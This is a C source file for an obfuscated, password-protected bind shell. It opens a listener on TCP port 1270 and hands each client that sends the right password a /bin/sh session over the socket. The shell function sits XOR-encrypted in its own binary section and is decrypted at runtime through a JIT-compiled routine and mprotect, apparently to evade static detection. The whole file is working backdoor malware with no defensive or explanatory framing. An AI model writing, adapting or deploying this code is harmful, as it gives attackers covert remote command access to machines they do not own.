#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <lightning.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

// the password to login to the shell
static const char s_password[] = password;

extern void* bind_shell_function_size;

void __attribute__((section(".bind_shell_function"))) bind_shell()
{
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr, "Failed to create the socket.");
        return;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind_addr.sin_port = htons(1270);

    int bind_result = bind(sock, (struct sockaddr*) &bind_addr, sizeof(bind_addr));
    if (bind_result != 0)
    {
        perror("Bind call failed");
        return;
    }

    int listen_result = listen(sock, 5);
    if (listen_result != 0)
    {
        perror("Listen call failed");
        return;
    }

    while (true)
    {
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0)
        {
            perror("Accept call failed");
            return;
        }

        int child_pid = fork();
        if (child_pid == 0)
        {
            // read in the password
            char password_input[sizeof(s_password)] = { 0 };
            int read_result = read(client_sock, password_input, sizeof(password_input));
            if (read_result < (int)(sizeof(s_password) - 1))
            {
                close(client_sock);
                return;
            }

            if (memcmp(s_password, password_input, sizeof(s_password) - 1) != 0)
            {
                close(client_sock);
                return;
            }

            dup2(client_sock, 0);
            dup2(client_sock, 1);
            dup2(client_sock, 2);

            char* empty[] = { NULL };
            execve("/bin/sh", empty, empty);
            close(client_sock);
            return;
        }

        close(client_sock);
    }
}

int main(int p_argc, char* p_argv[])
{
    (void)p_argc;

#if 1
    init_jit(p_argv[0]);
    jit_state_t* _jit = jit_new_state();

    jit_prolog();

    // function start
    jit_node_t* start_addr =  jit_arg();
    jit_node_t* end_addr =  jit_arg();

    // grab the arguments
    jit_getarg(JIT_R0, start_addr);
    jit_getarg(JIT_R1, end_addr);

    jit_node_t* loop = jit_label();
    jit_ldr(JIT_R2, JIT_R0);
    jit_xori(JIT_R2, JIT_R2, 0xaa);
    jit_str(JIT_R0, JIT_R2);
    jit_addi(JIT_R0, JIT_R0, 1);
    jit_node_t* branch = jit_bltr(JIT_R0, JIT_R1);
    jit_patch_at(branch, loop);
    jit_ret();

    void (*remove_xor)(char*, char*);
    remove_xor = jit_emit();
    jit_clear_state();

    mprotect(bind_shell, (uint64_t)&bind_shell_function_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    remove_xor((char*)bind_shell, (char*)bind_shell + (uint64_t)&bind_shell_function_size);
    mprotect(bind_shell, (uint64_t)&bind_shell_function_size, PROT_READ | PROT_EXEC);

    jit_destroy_state();
    finish_jit();
#else
    (void)p_argv;

    mprotect(bind_shell, (uint64_t)&bind_shell_function_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    for (unsigned int i = 0; i < (uint64_t)&bind_shell_function_size; i++)
    {
        char* bind_shell_ptr = (char*)bind_shell;
        bind_shell_ptr[i] = bind_shell_ptr[i] ^ 0xaa;
    }
    mprotect(bind_shell, (uint64_t)&bind_shell_function_size, PROT_READ | PROT_EXEC);
#endif

    bind_shell();
    return EXIT_SUCCESS;
}
